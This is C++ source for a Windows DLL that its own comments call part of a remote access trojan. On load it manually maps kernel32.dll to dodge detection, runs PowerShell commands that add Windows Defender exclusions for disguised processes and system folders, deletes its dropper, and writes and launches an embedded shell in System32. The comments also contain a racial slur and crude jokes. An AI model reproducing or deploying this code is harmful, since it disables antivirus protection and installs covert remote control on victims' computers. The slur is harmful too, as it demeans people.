// dllmain.cpp : Definisce il punto di ingresso per l'applicazione DLL.
#include "general.h"
#include "embeds.h"
#include "injection.h"
#include "powershell.h"


void main() {
	//Alloc console for debug purposes
    CreateDebugConsole();

    auto full_path = ExePath();
    //Perform self injection
	HANDLE hProc = GetCurrentProcess();

    //Don't call LoadLibraryA just because why make life easier for anyone
	auto pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
	while (!pKernel) {
		pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
	}

	//Uses manual mapped kernel32.dll to call CreateProcessA
	Powershell powershell((CreateProcessA_t)ResolveFunctionPtr(pKernel, L"CreateProcessA"));
	//Add exclusions for the Shell, Shell Manager and legitimate process (just to mess with anyone reversing this shit idk)   8================================================D
	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService.exe\"");
	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService32.exe\"");
	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthServiceManager.exe\"");
	//Add exclusion for C:\Windows\System32, where the service will be located, and some random ass folders just to mess with anyone reversing this bad boy
	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"");
    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\"");
    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\"");
    powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\Temp\"");
    //Our RAT won't really need Windows folder exclusions since we already excluded the processes, and there's always a backup shell capable of regenerating all its other parts via system Tasks

#ifndef SELF_INJECTION
    while (FileExists(full_path)) { //If update.exe still exists, wait for it to be renamed
        Sleep(100);
    }

    while (!remove((GetCWD() + "trash.tmp").c_str())) { //Remove the old executable as fast as possible to avoid sussy bakas looking around the folder :)
        Sleep(100);
    }
#endif
	CloseHandle(hProc);

    //Write the shell inside System modules folder, just because why not mess with them niggas
    std::ofstream output;
    output.open(SHELL_PATH(SHELL_NAME), std::ofstream::binary);
    output.write((char*)embedded_image_1, embedded_image_1_size);
    output.close();

    //Open the shell, which will then load the service and everything should be smooth sailing from here
    STARTUPINFOA info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    while (!CreateProcessA(SHELL_PATH(SHELL_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL,  & info, &processInfo))
    {
        Sleep(100);
    }
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)main, NULL, NULL, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
